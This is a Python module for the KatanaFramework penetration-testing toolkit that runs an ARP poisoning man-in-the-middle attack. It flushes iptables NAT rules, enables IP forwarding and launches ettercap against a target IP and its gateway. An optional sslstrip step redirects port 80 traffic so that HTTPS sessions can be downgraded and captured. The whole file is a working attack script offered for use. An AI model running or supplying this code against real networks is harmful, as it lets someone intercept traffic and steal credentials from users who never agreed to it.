# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  

# END LIBRARIES  

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="3.1"
	init.Description        ="ARP Poisoning"
	init.CodeName           ="net/arp.pson"
	init.DateCreation       ="26/08/2015"      
	init.LastModification   ="23/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["192.168.1.223"   ,True ,'Target IP'],
		'gateway'  :[GATEWAY           ,True ,'Gateway IP'],
		'https'    :["true"            ,False,'HTTP/s Capture']
	}

	init.aux = "\n Devices Founds: "+str(NET.GetInterfacesOnSystem())+"\n"
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	
	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):
		printk.inf("Starting ARP Poisoning [ettercap].")
		SYSTEM.Command_exe("Flushing Tables                          ","iptables --flush -t nat", std=False)
		SYSTEM.Command_exe("Enabling Ip Forward                      ","echo 1 > /proc/sys/net/ipv4/ip_forward", std=False)
		SYSTEM.Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
		
		if init.var['https']=="true":
			printk.inf("Starting SSL Capturing [sslstrip].")
			SYSTEM.Command_exe("Killing process using port               ","sudo fuser -kuv 10000/tcp", std=False)
			SYSTEM.Command_exe("Configuring Iptables                     ","iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", std=False)
			SYSTEM.Subprocess("sslstrip")

		raw_input(printk.pkey("if you want to stop ARP Attack (PRESS [ENTER])"))
		SYSTEM.KillProcess("ettercap")
		SYSTEM.KillProcess("sslstrip")
		SYSTEM.Command_exe("Disabling Ip Forward                     ","echo 0 > /proc/sys/net/ipv4/ip_forward", std=False)
		SYSTEM.Command_exe("Flushing Tables                          ","iptables --flush -t nat", std=False)

# END CODE MODULE ############################################################################################
